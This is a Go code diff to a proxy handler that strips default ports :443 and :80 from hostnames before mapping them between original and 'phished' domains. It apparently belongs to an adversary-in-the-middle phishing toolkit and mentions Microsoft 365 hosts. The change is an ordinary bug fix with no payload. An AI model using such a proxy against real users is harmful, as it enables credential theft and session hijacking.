@@ -1601,6 +1601,12 @@ func (m *ProxyHandler) replaceAllCaseInsensitive(s, old, newStr string) string {
 }
 
 func (m *ProxyHandler) replaceHostWithOriginal(hostname string, config map[string]service.ProxyServiceDomainConfig) string {
+	// strip default ports (:443/:80) before lookup
+	if host, port, err := net.SplitHostPort(hostname); err == nil {
+		if port == "443" || port == "80" {
+			hostname = host
+		}
+	}
 	for originalHost, hostConfig := range config {
 		if strings.EqualFold(hostConfig.To, hostname) {
 			return originalHost
@@ -1610,6 +1616,14 @@ func (m *ProxyHandler) replaceHostWithOriginal(hostname string, config map[strin
 }
 
 func (m *ProxyHandler) replaceHostWithPhished(hostname string, config map[string]service.ProxyServiceDomainConfig) string {
+	// strip default ports (:443 for HTTPS, :80 for HTTP) before lookup
+	// Location headers like "https://m365.cloud.microsoft:443/" include the port
+	// but config keys don't, causing lookup failures
+	if host, port, err := net.SplitHostPort(hostname); err == nil {
+		if port == "443" || port == "80" {
+			hostname = host
+		}
+	}
 	// first pass: look for exact matches (case-insensitive)
 	for originalHost, hostConfig := range config {
 		if strings.EqualFold(originalHost, hostname) {
